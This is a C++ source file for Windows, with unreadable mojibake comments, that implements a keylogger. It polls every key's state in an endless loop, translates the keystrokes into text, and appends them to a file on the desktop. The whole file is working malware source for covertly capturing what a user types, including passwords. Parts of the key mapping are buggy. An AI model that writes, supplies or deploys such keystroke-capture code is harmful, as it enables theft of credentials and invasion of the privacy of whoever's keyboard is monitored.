#include"Main.h"

int main()
{
	string FileName = "C:\\Users\\a\\Desktop\\Keybd.kbd";
	string KeyName = "";
	fstream FileStream;
	FileStream.open(FileName.c_str(), std::fstream::out | std::fstream::app);
	while(1)
	{
		Sleep(5);
		for(int i = 8; i <= 255; i++)
		{
			if(GetAsyncKeyState(i)&1 == 1)               
				//�ж����ⰴ���Ƿ��£�������һֱ���Ż��ǰ�һ�¾͵���ֻ�ж��Ƿ񰴹�
			{
				KeyName = GetKeyName(i);
				FileStream.write(KeyName.c_str(), KeyName.size());
				FileStream.close();                                //д��һ�ξͱ���һ��
				FileStream.open(FileName.c_str(), std::fstream::out | std::fstream::app);
			}
		}

	}
	return 0;
}

string GetKeyName(int NumKey)
{
	bool IS_SHIFT = JudgeShift();
	string revalue = "";
	//�жϼ����м���������
	if(NumKey >= 186 && NumKey <= 222)
		switch(NumKey)
	{
		case 186:
			if(IS_SHIFT) 
				revalue = ":";
			else 
				revalue = ";";
			break;
		case 187:
			if(IS_SHIFT) 
				revalue = "+";
			else 
				revalue = "=";
			break;
		case 188:
			if(IS_SHIFT) 
				revalue = "<";
			else 
				revalue = ",";
			break;
		case 189:
			if(IS_SHIFT) 
				revalue = "_";
			else 
				revalue = "-";
			break;
		case 190:
			if(IS_SHIFT) 
				revalue = ">";
			else 
				revalue = ".";
			break;
		case 191:
			if(IS_SHIFT) 
				revalue = "?";
			else 
				revalue = "/";
			break;
		case 192:
			if(IS_SHIFT) 
				revalue = "~";
			else 
				revalue = "`";
			break;
		case 219:
			if(IS_SHIFT) 
				revalue = "{";
			else 
				revalue = "[";
			break;
		case 220:
			if(IS_SHIFT) 
				revalue = "|";
			else 
				revalue = "\\";
			break;
		case 221:
			if(IS_SHIFT)
				revalue = "}";
			else
				revalue = "]";
			break;
		case 222:
			if(IS_SHIFT)
				revalue = '"';
			else
				revalue = ",";
		default:
			revalue = "error";
			break;
	}


	if (NumKey == VK_ESCAPE) // �˳�
		revalue = "[Esc]";
	else if (NumKey == VK_F1) // F1��F12
		revalue = "[F1]";
	else if (NumKey == VK_F2)
		revalue = "[F2]";
	else if (NumKey == VK_F3)
		revalue = "[F3]";
	else if (NumKey == VK_F4)
		revalue = "[F4]";
	else if (NumKey == VK_F5)
		revalue = "[F5]";
	else if (NumKey == VK_F6)
		revalue = "[F6]";
	else if (NumKey == VK_F7)
		revalue = "[F7]";
	else if (NumKey == VK_F8)
		revalue = "[F8]";
	else if (NumKey == VK_F9)
		revalue = "[F9]";
	else if (NumKey == VK_F10)
		revalue = "[F10]";
	else if (NumKey == VK_F11)
		revalue = "[F11]";
	else if (NumKey == VK_F12)
		revalue = "[F12]";
	else if (NumKey == VK_SNAPSHOT) // ��ӡ��Ļ
		revalue = "[PrScrn]";
	else if (NumKey == VK_SCROLL) // ��������
		revalue = "[Scroll Lock]";
	else if (NumKey == VK_PAUSE) // ��ͣ���ж�
		revalue = "[Pause]";
	else if (NumKey == VK_CAPITAL) // ��д����
		revalue = "[Caps Lock]";
	else if (NumKey == 8) //<- �ظ��
		revalue = "[Backspace]";
	else if (NumKey == VK_RETURN) // �س���������
		revalue = "[Enter]\n";
	else if (NumKey == VK_SPACE) // �ո�
		revalue = " ";
	else if (NumKey == VK_TAB) // �Ʊ��
		revalue = "[Tab]";
	else if (NumKey == VK_LCONTROL) // ����Ƽ�
		revalue = "[Ctrl]";
	else if (NumKey == VK_RCONTROL) // �ҿ��Ƽ�
		revalue = "[CTRL]";
	else if (NumKey == VK_LMENU) // �󻻵���
		revalue = "[Alt]";
	else if (NumKey == VK_LMENU) // �һ�����
		revalue = "[ALT]";
	else if (NumKey == VK_LWIN) // �� WINDOWS ��
		revalue = "[Win]";
	else if (NumKey == VK_RWIN) // �� WINDOWS ��
		revalue = "[WIN]";
	else if (NumKey == VK_APPS) // ������ �Ҽ�
		revalue = "�Ҽ�";
	else if (NumKey == VK_INSERT) // ����
		revalue = "[Insert]";
	else if (NumKey == VK_DELETE) // ɾ��
		revalue = "[Delete]";
	else if (NumKey == VK_HOME) // ��ʼ
		revalue = "[Home]";
	else if (NumKey == VK_END) // ����
		revalue = "[End]";
	else if (NumKey == VK_PRIOR) // ��һҳ
		revalue = "[PgUp]";
	else if (NumKey == VK_NEXT) // ��һҳ
		revalue = "[PgDown]";
	// �����õļ�����:һ�����û��
	else if (NumKey == VK_CANCEL) // Cancel
		revalue = "[Cancel]";
	else if (NumKey == VK_CLEAR) // Clear
		revalue = "[Clear]";
	else if (NumKey == VK_SELECT) //Select
		revalue = "[Select]";
	else if (NumKey == VK_PRINT) //Print
		revalue = "[Print]";
	else if (NumKey == VK_EXECUTE) //Execute
		revalue = "[Execute]";

	//----------------------------------------//
	else if (NumKey == VK_LEFT) //�ϡ��¡����Ҽ�
		revalue = "[��]";
	else if (NumKey == VK_RIGHT)
		revalue = "[��]";
	else if (NumKey == VK_UP)
		revalue = "[��]";
	else if (NumKey == VK_DOWN)
		revalue = "[��]";
	else if (NumKey == VK_NUMLOCK)//С������������
		revalue = "[NumLock]";
	else if (NumKey == VK_ADD) // �ӡ������ˡ���
		revalue = "+";
	else if (NumKey == VK_SUBTRACT)
		revalue = "-";
	else if (NumKey == VK_MULTIPLY)
		revalue = "*";
	else if (NumKey == VK_DIVIDE)
		revalue = "/";
	else if (NumKey == 190 || NumKey == 110) // С���� . ������ .
		revalue = ".";
	//С�������ּ�:0-9
	else if (NumKey == VK_NUMPAD0)
		revalue = "0";
	else if (NumKey == VK_NUMPAD1)
		revalue = "1";
	else if (NumKey == VK_NUMPAD2)
		revalue = "2";
	else if (NumKey == VK_NUMPAD3)
		revalue = "3";
	else if (NumKey == VK_NUMPAD4)
		revalue = "4";
	else if (NumKey == VK_NUMPAD5)
		revalue = "5";
	else if (NumKey == VK_NUMPAD6)
		revalue = "6";
	else if (NumKey == VK_NUMPAD7)
		revalue = "7";
	else if (NumKey == VK_NUMPAD8)
		revalue = "8";
	else if (NumKey == VK_NUMPAD9)
		revalue = "9";
	//----------------------------���������жϼ����ϳ�����ĸ֮��Ĺ��ܼ�--------------------------------//
	else if(NumKey >=65 && NumKey <= 90)
	{
		if(GetKeyState(VK_CAPITAL))
		{
			if(IS_SHIFT)
				revalue = NumKey + 32;
			else
				revalue = NumKey;
		}
		else
		{
			if(IS_SHIFT)
				revalue = NumKey;
			else
				revalue = NumKey + 32;
		}
	}
	//---------------------------����Ĳ����жϼ����ϵ���ĸ----------------------------------------------//
	else if(NumKey >= 48 && NumKey <= 57)
	{
		if(IS_SHIFT)
		{
			switch (NumKey)
			{
			case 48:revalue = ")";break;
			case 49:revalue = "!";break;
			case 50:revalue = "@";break;
			case 51:revalue = "#";break;
			case 52:revalue = "$";break;
			case 53:revalue = "%";break;
			case 54:revalue = "^";break;
			case 55:revalue = "&";break;
			case 56:revalue = "*";break;
			case 57:revalue = "(";break;
			}
		}
		else
		{
			switch (NumKey)
			{
			case 48:revalue = "0";break;
			case 49:revalue = "1";break;
			case 50:revalue = "2";break;
			case 51:revalue = "3";break;
			case 52:revalue = "4";break;
			case 53:revalue = "5";break;
			case 54:revalue = "6";break;
			case 55:revalue = "7";break;
			case 56:revalue = "8";break;
			case 57:revalue = "9";break;
			}
		}
	}
	return revalue;
}

bool JudgeShift()
{
	int   iShift=GetKeyState(0x10); //�ж�Shift��״̬
	bool   IS=(iShift & KeyBoardValue)==KeyBoardValue; //��ʾ����Shift��
	if(IS)
		return 1;
	else
		return 0;
}